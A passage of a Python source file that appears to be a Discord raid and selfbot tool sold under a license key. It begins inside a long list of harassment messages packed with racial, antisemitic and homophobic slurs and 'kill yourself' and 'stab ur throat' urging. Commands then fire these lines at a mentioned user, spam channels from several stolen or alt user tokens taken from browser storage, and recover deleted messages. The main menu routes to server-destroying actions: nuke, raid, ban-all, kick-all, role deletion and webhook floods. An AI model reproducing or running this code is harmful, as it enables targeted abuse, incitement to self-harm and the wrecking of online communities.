    "FIGTH ME BACK PUSSY?",
    "UR SCARED OF ME",
    "UR A FUCKING LOSER",
    "FIGHT ME NBACK NAZI",
    "UR SO MAD LOOOOOL",
    "U0R SO ANGRY",
    "U OVERDOSE ON STERIODS",
    "UR SO ANGRY LOOOL",
    "FIGHT ME BACK PUSSY",
    "NAZI PUSSY",
    "UR SO FUCKING TRASH AND A LOSER",
    "RETARD WHY SO ASS",
    "NIGGER UR TRASH",
    "KILL URSELF FAGGOT",
    "UR SO FUCKIGN TRASH COMMIT SUICIDE U JEWISH FUCKING RETARD",
    "UR SO FUCKIGN ANNOYING UR UGLY AS FUCK",
    "UR A WEAK ASS PUSSY UR SO MAD LFMAO",
    "UR SO ANGRY UR A FUCKIGN DYKE",
    "SHUT THE FUCK UP",
    "UR SO TRASH LOL KILL URSELF",
    "JEW",
    "UR SO ASS LMFOA UR SO ASS OL",
    "KILL URSELF DUMB ASS FUCKING LOSE",
    "UR SO ASS LFMAO UR SO TRASH",
    "TRASH ASS PUSSY",
    "DONT DIE TO ME UR SO ASS LOL",
    "UR SO TRASH DONT DIE",
    "UR SO ANGRY DONT DIE",
    "WEAK TRASH ASS NIGGA",
    "URSO ASS",
    "TRASH CAN U ALR FOLDED",
    "PUSSY ASS FAGGOT",
    "UR SO ANGRY LOL",
    "UR SO ASS LOL",
    "I BITCHED U",
    "UR A FUCKING PUSSY",
    "WHY SO ASS",
    "UR TO WEAK FOR ME TRASH ASS NIGGA",
    "UR SO UGLY AND FAT",
    "NIGGA UR TRASH",
    "UR SO ASS LOL",
    "PUSSY STOP FOLDING TO ME UR SO FUCKING ASS",
    "WEKA ASS LOSER UR SO TRASHS",
    "WEAK ASS PUSSY LOL",
    "UR SO MAD UR A LOSER UR ANGRY AS FUCK",
    "FIGHT ME BACK",
    "UR SO FUCKING ASS FIGHT ME BACK",
    "UR A FUCKING GEEK UR SO UGLY AND A LOSER",
    "UR A WEAK ASS PUSSY",
    "I WONT FOLD AND UR A LOSER",
    "UR SO FUCKIGN TRASH",
    "ITS BELT TO ASS RN",
    "BOX ME U WONT DO IT",
    "UR SO FUCKING TRASH AND UGLY",
    "STAB UR THROAT",
    "PUSSY ASS FAGGOT",
    "UR ON REPEAT UR A LOSER",
    "UR SO ANGRY",
    "FIGHT ME BACKPUSSY",
    "U AS FUCK PSYCHOPATH GEEK UR ASS AS FUCK",
    "UR TRASH UR MY SON UR UGLY AS FUCK FOREIGN RETARD GAY UR ASS AS FUCK",
    "UR MY BITCH UR MY SON UR UGLY AS FUCK STARVING MUSLIM NIGGA SHUT THE FUCK UP",
    "ASS FUCKING RETARD UR MY SON UR UGLY AS FUCK LIFELESS PARANOID UR UGLY AS FUCK",
    "WEAK ASS FUCK NIGGA UR MY SON UR UGLY AS FUCK CONTAMINATED HUMILIATION GARBAGE ASS FUCK NIGGA",
    "UR UGLY AS FUCK UR MY SON UR UGLY AS FUCK BRAIN DAMAGED MONGREL BITCH ASS FAGGOT",
    "WEAK ASS RETARD UR MY SON UR UGLY AS FUCK DIMWIT FAGGOT UR UGLY AS FUCK",
    "HOED ASS LOSER UR MY SON UR UGLY AS FUCK INFERIOR PREDATOR UR ASS FUCKING RETARD",
    "YOU DIED UR MY SON UR UGLY AS FUCK UNIMPORTANT GAY UR MY FUCKING SON UR SLOW AS FUCK UR TRASH AS FUCK",
    "GARBAGE ASS NIGGA UR MY SON UR UGLY AS FUCK OBNOXIOUS TRASH SHUT THE FUCK UP UR DEADASS TRASH",
    "UR MY FUCKING SLAVE UR ASS UR MY SON UR UGLY AS FUCK NECROPHILE UGLY TERRIBLE FUCKING WHORE",
    "YOU ARE RETARDED UR MY SON UR UGLY AS FUCK UNESTABLISHED SLOW POORON ASS NIGGA",
    "UR FUCKING RETARDED UR MY SON UR UGLY AS FUCK FAGGOT SCHIZOPHRENIC UR MY BITCH",
    "RETARDED FUCK NIGGA UR MY SON UR UGLY AS FUCK ALIEN DORK TRASH ASS FUCK NIGGA",
    "UGLY LITTLE FAGGOT UR MY SON UR UGLY AS FUCK LOOKSMAXXING ISLAM SLOW ASS LITTLE FUCKING RETARD",
    "UR MY BITCH UR MY SON UR UGLY AS FUCK MANIPULATED FAGGOT UR ASS AS FUCK",
    "FAGGOT ASS LOSER UR MY SON UR UGLY AS FUCK PSYCHOPATH INFURATED UR WEAK AS FUCK",
    "GARBAGE ASS RETARD UR MY SON UR UGLY AS FUCK ABANDONED FAGGOT NIGGA UR MY SON",
    "LITTLE ASS WHORE UR MY SON UR UGLY AS FUCK MUNICIPAL MUSLIM ON GOD YOU GOT FUCKING HOED",
    "UR MY BITCH UR MY SON UR UGLY AS FUCK DIMWIT JEWISH WEAK ASS FUCKING IDIOT",
    "WEAK ASS FUCK NIGGA UR MY SON UR UGLY AS FUCK GARBAGE SLUT UR SLOW AS FUCK",
    "CUCK ASS RETARD UR MY SON UR UGLY AS FUCK RANCID BLOATED RETARD UR UNKNOWN",
    "UR ASS UR MY SON UR UGLY AS FUCK SUBMISSIVE MUSLIM TRASH ASS FUCKING RETARD",
    "RETARDED FUCK NIGGA UR MY SON UR UGLY AS FUCK LESBIAN BITCH UR UGLY AS FUCK"
]

def load_selfbot_tokens():
    """Load selfbot tokens from file"""
    if not os.path.exists(SELFBOT_TOKENS_FILE):
        return {"main": None, "alts": [], "prefix": "."}
    
    try:
        with open(SELFBOT_TOKENS_FILE, "r") as f:
            data = json.load(f)
            global current_prefix
            current_prefix = data.get("prefix", ".")
            return data
    except Exception:
        return {"main": None, "alts": [], "prefix": "."}

def save_selfbot_tokens(data):
    """Save selfbot tokens to file"""
    try:
        with open(SELFBOT_TOKENS_FILE, "w") as f:
            json.dump(data, f, indent=2)
        return True
    except Exception:
        return False

def load_selfbot_config():
    """Load selfbot config from file"""
    if not os.path.exists(SELFBOT_CONFIG_FILE):
        return {}
    
    try:
        with open(SELFBOT_CONFIG_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

async def validate_user_token(token):
    """Validate a USER token (not bot token) - REJECTS BOT TOKENS"""
    # Clean token
    clean_token = token.strip().replace('"', '').replace("'", "")
    
    # Check if it looks like a bot token (starts with Bot)
    if clean_token.startswith('Bot ') or clean_token.startswith('bot '):
        return False, None, "bot_token_rejected"
    
    headers = {
        "Authorization": clean_token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            # Try to fetch user info from Discord API
            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
                if resp.status == 200:
                    user_data = await resp.json()
                    # Check if it's NOT a bot account (should be False for user tokens)
                    if user_data.get('bot', False):
                        return False, None, "bot_token_rejected"
                    username = f"{user_data['username']}#{user_data.get('discriminator', '0')}"
                    return True, username, "user"
                elif resp.status == 401:
                    return False, None, "invalid_token"
                else:
                    return False, None, f"api_error_{resp.status}"
    except asyncio.TimeoutError:
        return False, None, "timeout"
    except Exception as e:
        return False, None, f"connection_error: {str(e)}"

class SelfBot(commands.Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.deleted_messages = {}

    async def on_message_delete(self, message):
        if message.author.bot:
            return
        self.deleted_messages[str(message.channel.id)] = {
            "content": message.content or "[empty]",
            "author": str(message.author),
            "time": message.created_at.strftime("%Y-%m-%d %H:%M:%S")
        }

    # ── Spam ──────────────────────────────────────────────────────────────────
    @commands.command()
    async def spam(self, ctx, count: int, *, message: str):
        for _ in range(min(count, 50)):
            await ctx.send(message)
            await asyncio.sleep(0.8 + random.random() * 0.7)

    # ── Copycat ───────────────────────────────────────────────────────────────
    @commands.command()
    async def copycat(self, ctx, member: discord.Member):
        if member == ctx.author:
            await ctx.send("```Can't copy yourself.```")
            return
        copycat_users.add(str(member.id))
        await ctx.send(f"```Copycatting {member.display_name}```")

    @commands.command()
    async def copycat_stop(self, ctx):
        copycat_users.clear()
        await ctx.send("```Copycat stopped.```")

    @commands.command(name="stopchatpack")
    async def stopchatpack(self, ctx):
        copycat_users.clear()
        await ctx.send("```Chatpack / copycat stopped.```")

    # ── Purge ─────────────────────────────────────────────────────────────────
    @commands.command()
    async def purge(self, ctx, limit: int = 50):
        deleted = 0
        async for msg in ctx.channel.history(limit=min(limit, 100)):
            if msg.author == ctx.author:
                await msg.delete()
                deleted += 1
        await ctx.send(f"```Purged {deleted} messages.```", delete_after=5)

    # ── Chatpack & Beef ───────────────────────────────────────────────────────
    @commands.command()
    async def chatpack(self, ctx, member: discord.Member):
        line = random.choice(BEEF_LINES)
        await ctx.send(f"{member.mention} {line}")

    @commands.command()
    async def beef(self, ctx, member: discord.Member):
        for _ in range(10):
            line = random.choice(BEEF_LINES)
            await ctx.send(f"{member.mention} {line}")
            await asyncio.sleep(1.2 + random.random() * 0.8)

    # ── Tspam (all tokens) ────────────────────────────────────────────────────
    @commands.command()
    async def tspam(self, ctx, count: int, *, message: str):
        count = min(count, 20)
        for bot in running_bots:
            try:
                channel = bot.get_channel(ctx.channel.id)
                if channel:
                    for _ in range(count):
                        await channel.send(message)
                        await asyncio.sleep(1.5 + random.random())
            except:
                pass
        await ctx.send(f"```Tspam done ({count} per bot).```")

    # ── Snipe ─────────────────────────────────────────────────────────────────
    @commands.command()
    async def snipe(self, ctx):
        cid = str(ctx.channel.id)
        if cid in self.deleted_messages:
            d = self.deleted_messages[cid]
            await ctx.send(f"```Snipe:\nAuthor: {d['author']}\nTime: {d['time']}\nContent: {d['content']}```")
        else:
            await ctx.send("```Nothing sniped.```")

    # ── TVC ───────────────────────────────────────────────────────────────────
    @commands.command()
    async def tvc(self, ctx):
        if not ctx.author.voice:
            await ctx.send("```Main token must be in VC first.```")
            return
        vc = ctx.author.voice.channel
        for bot in running_bots:
            try:
                await vc.connect()
            except:
                pass
        await ctx.send(f"```All tokens joined {vc.name}. Use .tvc stop```")

    @commands.command()
    async def tvc_stop(self, ctx):
        for bot in running_bots:
            for vc in bot.voice_clients[:]:
                await vc.disconnect()
        await ctx.send("```All tokens left VC.```")

    # ── Custom Activity / RPC ─────────────────────────────────────────────────
    @commands.command(name="startactivity")
    async def startactivity(self, ctx, act_type: str, *, name: str):
        act_type = act_type.lower()
        act = None

        if act_type == "playing":
            act = discord.Game(name=name)
        elif act_type == "streaming":
            act = discord.Streaming(name=name, url="https://twitch.tv/null")
        elif act_type == "listening":
            act = discord.Activity(type=discord.ActivityType.listening, name=name)
        elif act_type == "watching":
            act = discord.Activity(type=discord.ActivityType.watching, name=name)
        elif act_type == "competing":
            act = discord.Activity(type=discord.ActivityType.competing, name=name)
        else:
            await ctx.send("```Types: playing, streaming, listening, watching, competing```")
            return

        await self.change_presence(activity=act)
        await ctx.send(f"```Activity set: {act_type.capitalize()} {name}```")

    @commands.command(name="stopactivity")
    async def stopactivity(self, ctx):
        await self.change_presence(activity=None)
        await ctx.send("```Custom activity cleared.```")

async def launch_selfbot(token, prefix, is_main=False):
    """Launch a selfbot instance with USER token ONLY - REJECTS BOT TOKENS"""
    # Validate it's a user token first
    print(f"{Fore.YELLOW}[INFO] Validating USER token...{Style.RESET_ALL}")
    valid, username, token_type = await validate_user_token(token)
    
    if not valid:
        if token_type == "bot_token_rejected":
            print(f"{Fore.RED}[ERROR] BOT token detected! This category requires USER tokens ONLY.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] Get USER tokens from browser Developer Tools{Style.RESET_ALL}")
            return
        else:
            print(f"{Fore.RED}[ERROR] Invalid token! ({token_type}){Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Valid USER token: {username}{Style.RESET_ALL}")
    
    intents = discord.Intents.all()
    
    # Clean the token (remove quotes, spaces, 'Bot ' prefix)
    clean_token = token.strip().replace('"', '').replace("'", '')
    if clean_token.startswith('Bot ') or clean_token.startswith('bot '):
        clean_token = clean_token[4:].strip()
    
    # Create selfbot instance with proper configuration
    class SelfBotInstance(commands.Bot):
        def __init__(self):
            super().__init__(
                command_prefix=prefix,
                intents=intents,
                help_command=None
            )
        
        async def on_ready(self):
            print(f"{Fore.GREEN}[ONLINE] {'MAIN' if is_main else 'ALT'} → {self.user} (USER){Style.RESET_ALL}")
            
            # Apply custom RPC from config.json for main token
            if is_main:
                rpc_config = load_selfbot_config()
                if rpc_config:
                    state = rpc_config.get("Rpcstate", "Birth Selfbot")
                    # Apply the custom presence
                    act = discord.Game(name=state)
                    await self.change_presence(activity=act)
                    print(f"{Fore.CYAN}[RPC] Applied custom presence: {state}{Style.RESET_ALL}")
    
    bot = SelfBotInstance()
    
    @bot.command()
    async def spam(ctx, count: int, *, message: str):
        for _ in range(min(count, 50)):
            await ctx.send(message)
            await asyncio.sleep(0.8 + random.random() * 0.7)

    @bot.command()
    async def copycat(ctx, member: discord.Member):
        if member == ctx.author:
            await ctx.send("```Can't copy yourself.```")
            return
        copycat_users.add(str(member.id))
        await ctx.send(f"```Copycatting {member.display_name}```")

    @bot.command()
    async def copycat_stop(ctx):
        copycat_users.clear()
        await ctx.send("```Copycat stopped.```")

    @bot.command(name="stopchatpack")
    async def stopchatpack(ctx):
        copycat_users.clear()
        await ctx.send("```Chatpack / copycat stopped.```")

    @bot.command()
    async def purge(ctx, limit: int = 50):
        deleted = 0
        async for msg in ctx.channel.history(limit=min(limit, 100)):
            if msg.author == ctx.author:
                await msg.delete()
                deleted += 1
        await ctx.send(f"```Purged {deleted} messages.```", delete_after=5)

    @bot.command()
    async def chatpack(ctx, member: discord.Member):
        line = random.choice(BEEF_LINES)
        await ctx.send(f"{member.mention} {line}")

    @bot.command()
    async def beef(ctx, member: discord.Member):
        for _ in range(10):
            line = random.choice(BEEF_LINES)
            await ctx.send(f"{member.mention} {line}")
            await asyncio.sleep(1.2 + random.random() * 0.8)

    @bot.command()
    async def tspam(ctx, count: int, *, message: str):
        count = min(count, 20)
        for bot_instance in running_bots:
            try:
                channel = bot_instance.get_channel(ctx.channel.id)
                if channel:
                    for _ in range(count):
                        await channel.send(message)
                        await asyncio.sleep(1.5 + random.random())
            except:
                pass
        await ctx.send(f"```Tspam done ({count} per bot).```")

    @bot.command()
    async def snipe(ctx):
        cid = str(ctx.channel.id)
        if hasattr(bot, 'deleted_messages') and cid in bot.deleted_messages:
            d = bot.deleted_messages[cid]
            await ctx.send(f"```Snipe:\nAuthor: {d['author']}\nTime: {d['time']}\nContent: {d['content']}```")
        else:
            await ctx.send("```Nothing sniped.```")

    @bot.command()
    async def tvc(ctx):
        if not ctx.author.voice:
            await ctx.send("```Main token must be in VC first.```")
            return
        vc = ctx.author.voice.channel
        for bot_instance in running_bots:
            try:
                await vc.connect()
            except:
                pass
        await ctx.send(f"```All tokens joined {vc.name}. Use .tvc stop```")

    @bot.command()
    async def tvc_stop(ctx):
        for bot_instance in running_bots:
            for vc in bot_instance.voice_clients[:]:
                await vc.disconnect()
        await ctx.send("```All tokens left VC.```")

    @bot.command(name="startactivity")
    async def startactivity(ctx, act_type: str, *, name: str):
        act_type = act_type.lower()
        act = None

        if act_type == "playing":
            act = discord.Game(name=name)
        elif act_type == "streaming":
            act = discord.Streaming(name=name, url="https://twitch.tv/null")
        elif act_type == "listening":
            act = discord.Activity(type=discord.ActivityType.listening, name=name)
        elif act_type == "watching":
            act = discord.Activity(type=discord.ActivityType.watching, name=name)
        elif act_type == "competing":
            act = discord.Activity(type=discord.ActivityType.competing, name=name)
        else:
            await ctx.send("```Types: playing, streaming, listening, watching, competing```")
            return

        await bot.change_presence(activity=act)
        await ctx.send(f"```Activity set: {act_type.capitalize()} {name}```")

    @bot.command(name="stopactivity")
    async def stopactivity(ctx):
        await bot.change_presence(activity=None)
        await ctx.send("```Custom activity cleared.```")
    
    running_bots.append(bot)
    
    try:
        # Use bot=False for user tokens
        await bot.start(clean_token, bot=False)
    except discord.LoginFailure as e:
        print(f"{Fore.RED}[ERROR] Login failed for {clean_token[:10]}...: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[INFO] Make sure you're using a USER token from browser Developer Tools{Style.RESET_ALL}")
        if bot in running_bots:
            running_bots.remove(bot)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {clean_token[:10]}... → {e}{Style.RESET_ALL}")
        if bot in running_bots:
            running_bots.remove(bot)

async def run_selfbot_setup():
    """Run selfbot setup wizard - USER TOKENS ONLY"""
    display_selfbot_ascii()
    print_centered(f"{get_color('light')}[+] Selfbot Setup Wizard (USER TOKENS ONLY){Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}This requires USER tokens ONLY, BOT tokens will be rejected!{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Get user token from browser Developer Tools → Application → Local Storage{Style.RESET_ALL}")
    
    main_token = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Main USER token > ").strip()
    
    if not main_token:
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Cancelled{Style.RESET_ALL}")
        return False
    
    # Validate user token
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Validating USER token...{Style.RESET_ALL}")
    valid, user, token_type = await validate_user_token(main_token)
    
    if not valid:
        if token_type == "bot_token_rejected":
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}BOT token detected! This category requires USER tokens only.{Style.RESET_ALL}")
            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Use this token in the Nuking category instead{Style.RESET_ALL}")
        else:
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid USER token! ({token_type}){Style.RESET_ALL}")
        return False
    
    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}USER token OK → {user}{Style.RESET_ALL}")
    
    # Get alt tokens
    alts = []
    print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Enter alt USER tokens (empty to finish){Style.RESET_ALL}")
    
    while True:
        alt_token = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Alt USER token > ").strip()
        if not alt_token:
            break
        
        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Validating alt USER token...{Style.RESET_ALL}")
        valid, user, token_type = await validate_user_token(alt_token)
        
        if valid:
            alts.append(alt_token)
            print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Added → {user}{Style.RESET_ALL}")
        else:
            if token_type == "bot_token_rejected":
                print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}BOT token detected - rejected{Style.RESET_ALL}")
            else:
                print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid USER token ({token_type}) - skipped{Style.RESET_ALL}")
    
    # Get prefix
    prefix = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Command prefix [default .] > ").strip() or "."
    
    # Save tokens
    data = {"main": main_token, "alts": alts, "prefix": prefix}
    if save_selfbot_tokens(data):
        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Setup complete! Saved {len(alts) + 1} USER token(s){Style.RESET_ALL}")
        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Use 'Start bots' to launch{Style.RESET_ALL}")
        return True
    else:
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Failed to save tokens{Style.RESET_ALL}")
        return False

async def start_selfbot():
    """Start all selfbot instances with USER tokens ONLY"""
    global selfbot_running
    
    if selfbot_running:
        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Selfbot already running{Style.RESET_ALL}")
        return
    
    data = load_selfbot_tokens()
    main = data.get("main")
    alts = data.get("alts", [])
    prefix = data.get("prefix", ".")
    
    if not main:
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}No main USER token found. Run setup first.{Style.RESET_ALL}")
        return
    
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Launching main + {len(alts)} alt USER token(s)...{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Using USER tokens ONLY (selfbot mode){Style.RESET_ALL}")
    
    # Launch main bot with user token
    asyncio.create_task(launch_selfbot(main, prefix, True))
    
    # Launch alts with user tokens
    for token in alts:
        asyncio.create_task(launch_selfbot(token, prefix))
    
    selfbot_running = True
    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}All USER bots launched!{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Prefix: {prefix} | Commands: spam, copycat, purge, etc.{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Remember: These are USER accounts ONLY, BOT tokens rejected!{Style.RESET_ALL}")

def stop_selfbot():
    """Stop all selfbot instances"""
    global selfbot_running
    
    if not selfbot_running:
        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Selfbot not running{Style.RESET_ALL}")
        return
    
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Stopping {len(running_bots)} USER bot(s)...{Style.RESET_ALL}")
    
    # This is a simplified stop - real implementation would need proper bot.close()
    for bot in running_bots:
        try:
            asyncio.create_task(bot.close())
        except:
            pass
    
    running_bots.clear()
    selfbot_running = False
    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}All USER bots stopped{Style.RESET_ALL}")

def show_selfbot_status():
    """Show selfbot status"""
    data = load_selfbot_tokens()
    main_exists = bool(data.get("main"))
    alt_count = len(data.get("alts", []))
    
    display_selfbot_ascii()
    print_centered(f"\n{get_color('light')}[+] Selfbot Status (USER TOKENS ONLY){Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
    
    status = "Running" if selfbot_running else "Stopped"
    print_centered(f"{get_color('light')}[Status]{Style.RESET_ALL} {Fore.CYAN}{status}{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[Bots]{Style.RESET_ALL} {Fore.CYAN}{len(running_bots)} active / {alt_count + 1 if main_exists else 0} total{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[Main]{Style.RESET_ALL} {Fore.CYAN}{'Configured' if main_exists else 'Not configured'}{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[Alts]{Style.RESET_ALL} {Fore.CYAN}{alt_count} configured{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[Prefix]{Style.RESET_ALL} {Fore.CYAN}{data.get('prefix', '.')}{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[Type]{Style.RESET_ALL} {Fore.CYAN}USER tokens ONLY (BOT tokens rejected){Style.RESET_ALL}")
    
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
    input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

async def handle_selfbot():
    """Handle selfbot category - USER TOKENS ONLY"""
    while True:
        choice = display_selfbot_menu()
        
        if choice == "1":
            await run_selfbot_setup()
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "2":
            await start_selfbot()
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "3":
            stop_selfbot()
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "4":
            show_selfbot_status()
            
        elif choice == "0":
            break
            
        else:
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid option{Style.RESET_ALL}")
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────────────────────
#   MAIN LOOP
# ────────────────────────────────────────────────────────────────────────────────

def main():
    global current_theme
    
    valid_license, license_key = validate_license_key()
    
    if not valid_license:
        valid_license, license_key = validate_license_key(save_license_prompt=True)
    
    if not valid_license:
        print(f"{Fore.RED}[ERROR] Invalid license key. Exiting...{Style.RESET_ALL}")
        sys.exit(1)
    
    while True:
        choice = display_main_menu()
        
        if choice == "1":
            color_choice = display_color_selection()
            if color_choice in COLOR_THEMES:
                current_theme = COLOR_THEMES[color_choice]
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color changed to {current_theme['name']}{Style.RESET_ALL}")
            else:
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid color choice{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()
            
        elif choice == "2":
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Generating new ID...{Style.RESET_ALL}")
            
            licenses = fetch_license_data()
            user_id = ""
            
            for license_entry in licenses:
                if license_entry.get("Licensekey") == license_key:
                    user_id = license_entry.get("id", "").strip()
                    break
            
            if not user_id:
                user_id = generate_random_id()
                update_license_data_with_ip(license_key, get_hwid(), user_id, None)
            
            save_id_to_file(user_id, license_key)
            print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}ID generated and saved!{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()
            
        elif choice == "3":
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}NUKING CATEGORY: BOT TOKENS ONLY{Style.RESET_ALL}")
            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Get bot tokens from Discord Developer Portal{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}USER TOKENS WILL BE REJECTED IN THIS CATEGORY{Style.RESET_ALL}")
            
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
            while True:
                sub = display_nuking_menu()

                if sub in ("0", "", "back"):
                    break

                # For webhook spam, we don't need bot token
                if sub == "4":
                    asyncio.run(webhook_spam(None))
                    input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
                    continue

                # Get BOT token for other options
                token = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}BOT Token (from Developer Portal) > ").strip()
                if not token: 
                    print(f"{Fore.RED}[ERROR] No BOT token provided!{Style.RESET_ALL}")
                    continue

                # Map options to functions
                action_map = {
                    "1": fast_nuke,
                    "2": nuke,
                    "3": raid,
                    "5": webhook_flood,
                    "6": role_delete,
                    "7": role_spam,
                    "8": ban_all,
                    "9": kick_all,
                }

                if sub in action_map:
                    print(f"{Fore.YELLOW}[INFO] Starting action {sub} with BOT token...{Style.RESET_ALL}")
                    try:
                        asyncio.run(run_nuker(token, action_map[sub]))
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR] Failed to run action: {e}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[ERROR] Invalid option{Style.RESET_ALL}")

                input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
                
        elif choice == "4":
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}SELFBOT CATEGORY: USER TOKENS ONLY{Style.RESET_ALL}")
            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Get user tokens from browser Developer Tools{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}BOT TOKENS WILL BE REJECTED IN THIS CATEGORY{Style.RESET_ALL}")
            
            input(f"\n{get_color('light')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            asyncio.run(handle_selfbot())
            
        elif choice == "5" or choice.lower() == "exit":
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.WHITE}Exiting...{Style.RESET_ALL}")
            time.sleep(1)
            sys.exit(0)
            
        else:
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Invalid option{Style.RESET_ALL}")
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Interrupted{Style.RESET_ALL}")
        sys.exit(0)
